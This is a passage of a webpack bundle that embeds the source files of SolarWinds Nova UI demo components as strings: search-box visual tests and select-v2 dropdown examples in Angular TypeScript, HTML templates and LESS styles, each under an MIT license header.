efficitur luctus quis ac elit. Nam odio est, iaculis nec varius id, congue erat.\n        Nullam mi lectus, gravida quis pretium sit amet, accumsan non elit. In tempus commodo sem ac vulputate.\n        Sed vel sagittis purus. Integer non ornare felis. Sed aliquam, purus et euismod tincidunt, felis ligula\n        fermentum mi, eget commodo nisl orci efficitur dui. Etiam interdum justo magna consequat, vitae\n        hendrerit mi aliquam. Sed non ex eu purus ornare lobortis tempus id est. Aenean dictum at dui sit amet mollis.\n        Phasellus mauris arcu, blandit id congue vitae, elementum amet enim.\n        Pellentesque et facilisis leo, sit amet rhoncus magna. Integer commodo lobortis arcu et bibendum.\n        Pellentesque sagittis magna sed tellus volutpat, sed eleifend justo ornare.\n        Fusce porttitor laoreet dui a mollis.\n    `;\n    public value: string;\n\n    public interval = 2000;\n\n    public isInErrorState = true;\n\n    public onCancel(value: string): void {\n        this.value = "";\n        this.searchKey = "";\n    }\n\n    public onFocusChange(event: boolean): void {\n        this.captureFocus = event;\n    }\n\n    public onInputChange(value: string): void {\n        this.value = value;\n    }\n\n    public onSearch(value: string): void {\n        this.doSearch(value);\n    }\n\n    public setFocus(): void {\n        this.captureFocus = true;\n        setTimeout(() => {\n            this.captureFocus = false;\n        }, this.interval);\n    }\n\n    private doSearch(value: string): void {\n        this.searchKey = value;\n    }\n}\n'},10855:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<div class="container">\n    <div class="row">\n        <div class="col">\n            <h3>Basic Search</h3>\n            <nui-search id="nui-visual-test-basic-search"></nui-search>\n        </div>\n        <div class="col">\n            <h3>Search with Custom Placeholder</h3>\n            <nui-search\n                placeholder="Type here to search..."\n                id="nui-visual-test-search-with-placeholder"\n            ></nui-search>\n        </div>\n    </div>\n    <div class="row">\n        <div class="col">\n            <h3>Search with input text</h3>\n            <nui-search\n                [value]="value"\n                id="nui-visual-test-search-with-input-text"\n            ></nui-search>\n        </div>\n    </div>\n</div>\n'},55519:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\n@Component({\n    selector: "nui-search-visual-test",\n    templateUrl: "./search-visual-test.component.html",\n})\nexport class SearchVisualTestComponent {\n    public value: string = "example value";\n}\n'},64033:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { NgModule } from "@angular/core";\nimport { FormsModule, ReactiveFormsModule } from "@angular/forms";\nimport { RouterModule } from "@angular/router";\n\nimport {\n    DEMO_PATH_TOKEN,\n    NuiButtonModule,\n    NuiCommonModule,\n    NuiDocsModule,\n    NuiSearchModule,\n    NuiSelectModule,\n    NuiTextboxModule,\n    SrlcStage,\n} from "@nova-ui/bits";\n\nimport {\n    SearchBasicExampleComponent,\n    SearchDocsExampleComponent,\n    SearchFocusChangeExampleComponent,\n    SearchInputChangeExampleComponent,\n    SearchOnSearchCancelExampleComponent,\n    SearchPlaceholderExampleComponent,\n    SearchTestExampleComponent,\n    SearchVisualTestComponent,\n    SearchErrorStateExampleComponent,\n} from "./index";\nimport { getDemoFiles } from "../../../static/demo-files-factory";\n\nconst routes = [\n    {\n        path: "",\n        component: SearchDocsExampleComponent,\n        data: {\n            srlc: {\n                stage: SrlcStage.ga,\n            },\n            showThemeSwitcher: true,\n        },\n    },\n    {\n        path: "search-test",\n        component: SearchTestExampleComponent,\n        data: {\n            srlc: {\n                hideIndicator: true,\n            },\n        },\n    },\n    {\n        path: "search-visual-test",\n        component: SearchVisualTestComponent,\n        data: {\n            srlc: {\n                hideIndicator: true,\n            },\n        },\n    },\n];\n\n@NgModule({\n    imports: [\n        NuiButtonModule,\n        NuiSearchModule,\n        NuiTextboxModule,\n        NuiDocsModule,\n        NuiCommonModule,\n        FormsModule,\n        ReactiveFormsModule,\n        RouterModule.forChild(routes),\n        NuiSelectModule,\n    ],\n    declarations: [\n        SearchTestExampleComponent,\n        SearchBasicExampleComponent,\n        SearchDocsExampleComponent,\n        SearchFocusChangeExampleComponent,\n        SearchInputChangeExampleComponent,\n        SearchOnSearchCancelExampleComponent,\n        SearchPlaceholderExampleComponent,\n        SearchErrorStateExampleComponent,\n        SearchVisualTestComponent,\n    ],\n    providers: [\n        {\n            provide: DEMO_PATH_TOKEN,\n            useValue: getDemoFiles("search"),\n        },\n    ],\n    exports: [RouterModule],\n})\nexport default class SearchModule {}\n'},39806:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nexport * from "./select-v2-basic/select-v2-basic.example.component";\nexport * from "./select-v2-docs/select-v2-docs.example.component";\nexport * from "./select-v2-grouped-items/select-v2-grouped-items.example.component";\nexport * from "./select-v2-disabled/select-v2-disabled.example.component";\nexport * from "./select-v2-error/select-v2-error.example.component";\nexport * from "./select-v2-inline/select-v2-inline.example.component";\nexport * from "./select-v2-styling/select-v2-styling.example.component";\nexport * from "./select-v2-virtual-scroll/select-v2-virtual-scroll.example.component";\nexport * from "./select-v2-overlay-config/select-v2-overlay-config.example.component";\nexport * from "./select-v2-reactive-form-field/select-v2-reactive-form-field.example.component";\nexport * from "./select-v2-customize-options/select-v2-customize-options.example.component";\nexport * from "./select-v2-custom-control/select-v2-custom-control.example.component";\nexport * from "./select-v2-test/select-v2-test.example.component";\nexport * from "./select-v2-custom-content/select-v2-custom-content.example.component";\nexport * from "./select-v2-options-changed/select-v2-options-changed.example.component";\nexport * from "./select-v2-getting-value/select-v2-getting-value.example.component";\nexport * from "./select-v2-setting-value/select-v2-setting-value.example.component";\nexport * from "./select-v2-color-picker/select-v2-color-picker.component";\n'},81216:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-select-v2\n    placeholder="Select Item"\n    i18n-placeholder\n    [formControl]="selectControl"\n>\n    <nui-select-v2-option *ngFor="let item of items" [value]="item">{{\n        item\n    }}</nui-select-v2-option>\n</nui-select-v2>\n'},55104:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\nimport { FormControl } from "@angular/forms";\n\n@Component({\n    selector: "nui-select-v2-basic-example",\n    templateUrl: "select-v2-basic.example.component.html",\n    host: { class: "select-container" },\n})\nexport class SelectV2BasicExampleComponent {\n    public items = Array.from({ length: 50 }).map(\n        (_, i) => $localize`Item ${i}`\n    );\n    public selectControl = new FormControl<string | null>(null);\n}\n'},67318:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='\x3c!-- Since we need the select input to show only the current color we need to use displayValueTemplate input and a corresponding template.\n     Don\'t forget to disable the width synchronization, so that the overlay does not follow the toggle reference\'s width --\x3e\n<nui-select-v2\n    placeholder="Select Item"\n    i18n-placeholder\n    class="color-picker-select"\n    [overlayConfig]="overlayConfig"\n    [syncWidth]="false"\n    [displayValueTemplate]="colorSelectTemplate"\n>\n    \x3c!-- The following block (along with the corresponding ng-template below) builds the markup of the color picker boxes inside the overlay. --\x3e\n    <div class="color-picker-container">\n        <div\n            class="d-inline-flex flex-wrap box"\n            *ngFor="let item of backgroundColors"\n        >\n            <nui-select-v2-option\n                [value]="item"\n                [displayValueContext]="item"\n                class="w-100 h-100 reset-box-sizes"\n                #option\n            >\n                \x3c!-- This block defines the overlay color boxes markup --\x3e\n                <div\n                    class="color-picker-option"\n                    [class.color-picker-option--selected]="option?.selected"\n                >\n                    <div\n                        class="color-picker-option__color-box"\n                        [style.background-color]="item"\n                    >\n                        \x3c!-- Notice here how \'mix-blend-mode\' is used conditionally. Since the glyph sign is always white and is being set as a background image, \n                                            we need a way to make it visible on white background. Since white background is default for the light theme, we bind to that and\n                                            apply the property to mix and differ two backgrounds - the glyph and the underlaying box color background --\x3e\n                        <div\n                            class="color-picker-option__glyph"\n                            [style.mix-blend-mode]="\n                                item === defaultColor ? \'difference\' : null\n                            "\n                            *ngIf="option?.selected"\n                        ></div>\n                    </div>\n                </div>\n            </nui-select-v2-option>\n        </div>\n    </div>\n</nui-select-v2>\n\n\x3c!-- This template defines the input markup --\x3e\n<ng-template #colorSelectTemplate let-item let-open="open">\n    <div class="color-picker-input">\n        <div class="color-picker-input__box">\n            <div\n                class="color-picker-input__color-box"\n                [style.background-color]="item"\n            ></div>\n        </div>\n        <div class="color-picker-input__toggle">\n            <nui-icon\n                [style.transform]="open ? \'rotate(180deg)\' : \'\'"\n                icon="caret-down"\n            ></nui-icon>\n        </div>\n    </div>\n</ng-template>\n'},42438:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='@import (reference) "nui-framework-variables";\n@import (reference) "mixins";\n\n.picker-tile-size() {\n    width: 30px;\n    height: 30px;\n}\n\n.color-box() {\n    width: @nui-space-md + 1;\n    height: @nui-space-md + 1;\n    border-radius: @nui-radius-default;\n    border: 1px solid;\n    .setCssVariable(border-color, nui-color-line-default);\n}\n\n.color-box-input() {\n    .color-box();\n    width: @nui-space-md + @nui-space-xxs;\n    height: @nui-space-md + @nui-space-xxs;\n}\n\n.box {\n    .picker-tile-size();\n}\n\n.color-picker {\n    &-container {\n        padding: @nui-space-xs @nui-space-sm;\n    }\n    &-select {\n        width: fit-content;\n        min-width: unset;\n        cursor: pointer;\n    }\n\n    &-input {\n        display: flex;\n\n        &__box {\n            display: flex;\n            align-items: center;\n            flex-grow: 1;\n        }\n\n        &__color-box {\n            .color-box-input();\n            flex-grow: 1;\n            margin: 0 10px;\n        }\n\n        &__toggle {\n            display: flex;\n            justify-content: center;\n            align-items: center;\n            border-left: 1px solid;\n            .setCssVariable(border-left-color, nui-color-line-default);\n            .picker-tile-size();\n        }\n    }\n\n    &-option {\n        display: flex;\n        justify-content: center;\n        align-items: center;\n        height: 100%;\n\n        &__color-box {\n            .color-box();\n            padding: 1px 0 0 1px;\n        }\n\n        &--selected {\n            .setCssVariable(background-color, nui-color-selected);\n            &:focus {\n                outline: none;\n            }\n        }\n\n        &__glyph {\n            .nui-checkbox__glyph();\n            background-repeat: no-repeat;\n        }\n    }\n}\n'},82594:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { OverlayConfig } from "@angular/cdk/overlay";\nimport { Component } from "@angular/core";\n\nconst CHART_PALETTE_CS1: string[] = [\n    "var(--nui-color-bg-secondary)",\n    "var(--nui-color-chart-one)",\n    "var(--nui-color-chart-two)",\n    "var(--nui-color-chart-three)",\n    "var(--nui-color-chart-four)",\n    "var(--nui-color-chart-five)",\n    "var(--nui-color-chart-six)",\n    "var(--nui-color-chart-seven)",\n    "var(--nui-color-chart-eight)",\n    "var(--nui-color-chart-nine)",\n    "var(--nui-color-chart-ten)",\n];\n\n// Left and right paddings of .color-picker-container element\nconst CONTAINER_SIDE_PADDINGS_PX: number = 20;\n// Width of the .box element\nconst BOX_WIDTH_PX: number = 30;\n\n@Component({\n    selector: "nui-select-v2-color-picker",\n    templateUrl: "./select-v2-color-picker.component.html",\n    styleUrls: ["./select-v2-color-picker.component.less"],\n})\nexport class SelectV2ColorPickerComponent {\n    // With this param one is able to configure how many columns wide should the color picker be\n    public cols: number = 6;\n\n    public overlayConfig: OverlayConfig = {\n        // To automatically calculate the max-width use the approach below if you want to optionally change the amount of color boxes per row,\n        // but for most cases just hardcoding the necessary value will be enough\n        maxWidth: this.cols\n            ? this.cols * BOX_WIDTH_PX + CONTAINER_SIDE_PADDINGS_PX + "px"\n            : "150px", // defaults to 4 columns picker\n    };\n    public backgroundColors: string[] = CHART_PALETTE_CS1;\n    public defaultColor = "var(--nui-color-bg-secondary)";\n}\n'},89496:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-select-v2\n    placeholder="Select Item"\n    i18n-placeholder\n    class="action"\n    #select\n    [displayValueTemplate]="customTemplate"\n>\n    <nui-select-v2-option-group *ngFor="let item of items">\n        <button\n            nui-button\n            type="button"\n            displayStyle="action"\n            [icon]="\'add\'"\n            class="custom-box"\n            (click)="actionSimulation()"\n        >\n            Add new filtered state\n        </button>\n        <nui-divider size="extra-small"></nui-divider>\n        <span class="nui-select-v2-option-group--header">{{\n            item.headerName\n        }}</span>\n        <nui-select-v2-option\n            *ngFor="let option of item.options"\n            [value]="option.id"\n            [displayValueContext]="option"\n        >\n            {{ option.name }}\n            <button\n                nui-button\n                type="button"\n                displayStyle="action"\n                [icon]="\'menu\'"\n                (click)="actionSimulation($event)"\n            ></button>\n        </nui-select-v2-option>\n    </nui-select-v2-option-group>\n</nui-select-v2>\n\n<ng-template #customTemplate let-context let-open="open">\n    <div class="custom-container">\n        <div *ngIf="context; else empty" class="custom-input-template">\n            <span>{{ context.name }}</span>\n            <nui-icon class="ml-2" [icon]="context.icon"></nui-icon>\n        </div>\n\n        <nui-icon\n            [style.transform]="open ? \'rotate(180deg)\' : \'\'"\n            icon="caret-down"\n        ></nui-icon>\n    </div>\n\n    <ng-template #empty>\n        <span class="nui-select-v2__placeholder">Select Item</span>\n    </ng-template>\n</ng-template>\n'},46704:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='@import (reference) "nui-framework-variables";\n@import (reference)\n    "../../../../../../src/styles/components/combobox-v2-addons.less";\n@import (reference) "mixins";\n\nnui-select-v2 {\n    width: 320px;\n    height: 36px;\n}\n\nnui-select-v2-option {\n    display: flex;\n    justify-content: space-between;\n    align-items: center;\n\n    &:not(.selected) {\n        .setCssVariable(color, primary_blue) !important;\n    }\n\n    &.selected {\n        .setCssVariable(background-color, nui-color-selected) !important;\n    }\n}\n\n.custom-container {\n    cursor: pointer;\n    display: flex;\n    width: 100%;\n    height: 100%;\n    align-items: center;\n    justify-content: space-between;\n    padding: @nui-space-xs @nui-space-sm;\n}\n\n.custom-input-template {\n    display: flex;\n    align-items: center;\n\n    .setCssVariable(color, primary_blue);\n    font-family: @font-family-open-sans;\n    font-size: @nui-font-size-hero;\n    font-weight: @nui-font-weight-regular;\n    line-height: @nui-line-height-big;\n\n    nui-icon {\n        position: relative;\n        top: -4px;\n    }\n}\n\n.custom-box {\n    .nui-combobox-v2__popup-box();\n    width: 100%;\n    max-width: unset !important;\n    justify-content: flex-start !important;\n}\n'},31240:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { ChangeDetectionStrategy, Component, Inject } from "@angular/core";\n\nimport { ToastService } from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-select-v2-custom-content-example",\n    templateUrl: "./select-v2-custom-content.example.component.html",\n    changeDetection: ChangeDetectionStrategy.OnPush,\n    styleUrls: ["select-v2-custom-content.example.component.less"],\n})\nexport class SelectV2CustomContentExampleComponent {\n    public items = [\n        {\n            headerName: $localize`Saved Data Filters`,\n            options: [\n                {\n                    id: 1,\n                    name: $localize`All Services`,\n                    icon: "check",\n                },\n                {\n                    id: 2,\n                    name: $localize`Unified Communication Apps`,\n                    icon: "execute",\n                },\n            ],\n        },\n    ];\n\n    constructor(@Inject(ToastService) private toastService: ToastService) {}\n\n    public actionSimulation(event: Event): void {\n        this.toastService.info({\n            message: $localize`Action Occurred!`,\n        });\n        event?.stopPropagation();\n    }\n}\n'},70896:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-select-v2\n    placeholder="Select Item"\n    i18n-placeholder\n    [manualDropdownControl]="true"\n    class="w-25"\n>\n    <nui-select-v2-option *ngFor="let item of items" [value]="item">\n        {{ item }}\n    </nui-select-v2-option>\n</nui-select-v2>\n\n<div class="ml-4 d-flex w-75">\n    <button nui-button type="button" class="mr-3" (click)="showList($event)">\n        Show\n    </button>\n\n    <button nui-button type="button" class="mr-3" (click)="hideList($event)">\n        Hide\n    </button>\n\n    <button nui-button type="button" class="mr-3" (click)="toggleList($event)">\n        Toggle\n    </button>\n\n    <div class="d-flex align-items-center">\n        <nui-switch [(value)]="handleClicksOutside" i18n>\n            Close on focus-out\n        </nui-switch>\n    </div>\n</div>\n'},62448:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { AfterViewInit, Component, ViewChild } from "@angular/core";\n\nimport { SelectV2Component } from "@nova-ui/bits";\n\n@Component({\n    selector: "nui-select-v2-custom-control-example",\n    templateUrl: "select-v2-custom-control.example.component.html",\n    host: { class: "select-container d-flex justify-content-between" },\n})\nexport class SelectV2CustomControlExampleComponent implements AfterViewInit {\n    public items = Array.from({ length: 100 }).map(\n        (_, i) => $localize`Item ${i}`\n    );\n    public handleClicksOutside: boolean = false;\n\n    @ViewChild(SelectV2Component) private select: SelectV2Component;\n\n    public ngAfterViewInit(): void {\n        this.select.clickOutsideDropdown.subscribe(() => {\n            if (this.handleClicksOutside) {\n                this.select.hideDropdown();\n            }\n        });\n    }\n\n    public showList(event: Event): void {\n        event.stopPropagation();\n        this.select.showDropdown();\n        this.select.inputElement.nativeElement.focus();\n    }\n\n    public hideList(event: Event): void {\n        event.stopPropagation();\n        this.select.hideDropdown();\n    }\n\n    public toggleList(event: Event): void {\n        event.stopPropagation();\n        this.select.toggleDropdown();\n        this.select.inputElement.nativeElement.focus();\n    }\n}\n'},56344:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-select-v2\n    placeholder="Select Item"\n    i18n-placeholder\n    [formControl]="selectControl"\n    [displayValueTemplate]="customTemplate"\n    #select\n>\n    <nui-select-v2-option\n        *ngFor="let item of items"\n        [value]="item.id"\n        [displayValueContext]="item"\n    >\n        Name is {{ item.name }} and icon is\n        <nui-icon [icon]="item.icon"></nui-icon>\n    </nui-select-v2-option>\n</nui-select-v2>\n\n<ng-template #customTemplate let-item>\n    <div class="nui-select-v2__value">\n        <div\n            *ngIf="item; else empty"\n            class="d-flex align-items-center nui-select-v2__value-content"\n        >\n            <nui-icon class="mr-2" [icon]="item.icon"></nui-icon>\n            {{ item.name }}\n        </div>\n\n        <nui-icon\n            [style.transform]="select.isDropdownOpen ? \'rotate(180deg)\' : \'\'"\n            icon="caret-down"\n        ></nui-icon>\n    </div>\n\n    <ng-template #empty>\n        <span class="nui-select-v2__placeholder">Select Item</span>\n    </ng-template>\n</ng-template>\n'},8520:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\nimport { FormControl } from "@angular/forms";\n\ninterface IExampleItem {\n    id: string;\n    name: string;\n    icon: string;\n}\n\n@Component({\n    selector: "nui-select-v2-customize-options-example",\n    templateUrl: "select-v2-customize-options.example.component.html",\n    host: { class: "select-container" },\n})\nexport class SelectV2CustomizeOptionsExampleComponent {\n    public icons: string[] = ["check", "email", "execute"];\n    public items: IExampleItem[] = Array.from({ length: 100 }).map((_, i) => ({\n        id: `value-${i}`,\n        name: $localize`Item ${i}`,\n        icon: this.getRandomIcon(),\n    }));\n    public selectControl = new FormControl<IExampleItem | null>(null);\n\n    private getRandomIcon() {\n        return this.icons[Math.round(Math.random() * 2)];\n    }\n}\n'},83770:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='<nui-select-v2\n    [isDisabled]="isSelectDisabled"\n    placeholder="Select Item"\n    i18n-placeholder\n    class="w-50 d-inline-flex"\n>\n    <nui-select-v2-option\n        *ngFor="let item of items"\n        [value]="item"\n        [isDisabled]="item.disabled"\n    >\n        {{ item.name }}\n    </nui-select-v2-option>\n</nui-select-v2>\n\n<nui-switch\n    class="d-inline-flex"\n    style="padding-left: 15px"\n    [(value)]="isSelectDisabled"\n    i18n\n>\n    Toggle disabling\n</nui-switch>\n'},62438:(o,n,e)=>{"use strict";e.r(n),e.d(n,{default:()=>t});const t='// \xa9 2022 SolarWinds Worldwide, LLC. All rights reserved.\n//\n// Permission is hereby granted, free of charge, to any person obtaining a copy\n//  of this software and associated documentation files (the "Software"), to\n//  deal in the Software without restriction, including without limitation the\n//  rights to use, copy, modify, merge, publish, distribute, sublicense, and/or\n//  sell copies of the Software, and to permit persons to whom the Software is\n//  furnished to do so, subject to the following conditions:\n//\n// The above copyright notice and this permission notice shall be included in\n//  all copies or substantial portions of the Software.\n//\n// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\n//  IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\n//  FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\n//  AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\n//  LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\n//  OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN\n//  THE SOFTWARE.\n\nimport { Component } from "@angular/core";\n\ninterface IExampleItem {\n    name: string;\n    disabled: boolean;\n}\n\n@Component({\n    